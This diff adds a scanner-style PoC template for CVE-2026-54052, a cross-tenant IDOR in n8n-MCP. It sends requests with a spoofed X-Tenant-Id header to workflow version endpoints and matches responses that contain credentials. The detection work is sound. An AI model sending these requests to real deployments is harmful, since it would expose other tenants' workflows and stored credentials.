@@ -1,0 +1,132 @@
+[info]
+author = "AVE"
+description = "检测 n8n-MCP 多租户 HTTP 模式下是否存在跨租户工作流版本历史越权访问漏洞。通过构造不同租户身份标识请求工作流版本历史端点，判断是否存在租户隔离缺失（IDOR）。"
+id = "POC-AVE-2026-0448"
+name = "CVE-2026-54052 n8n-MCP 跨租户工作流版本历史越权访问 PoC"
+severity = "critical"
+tags = [
+    "cve-2026-54052",
+    "idor",
+    "cwe-639",
+    "cwe-862",
+    "n8n-mcp",
+]
+vuln_id = [
+    "CVE-2026-54052",
+    "AVE-2026-0448",
+    "GHSA-j6r7-6fhx-77wx",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/health"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "n8n",
+    "mcp",
+    "workflow",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc","version":"1"}}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "n8n",
+    "mcp",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/workflows/1/versions"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+X-Tenant-Id = "poc-attacker"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "nodes",
+    "credentials",
+    "versionId",
+    "snapshot",
+    "backup",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/workflows/1/versions"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+X-Tenant-Id = "poc-attacker"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "nodes",
+    "credentials",
+    "versionId",
+    "snapshot",
+    "backup",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/mcp/tools/get_workflow_versions"
+protocol = "http"
+
+[poc.requests.body]
+content = "workflowId=1"
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json"
+User-Agent = "AVE/1.0"
+X-Tenant-Id = "poc-attacker"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "nodes",
+    "credentials",
+    "versionId",
+    "snapshot",
+    "backup",
+]
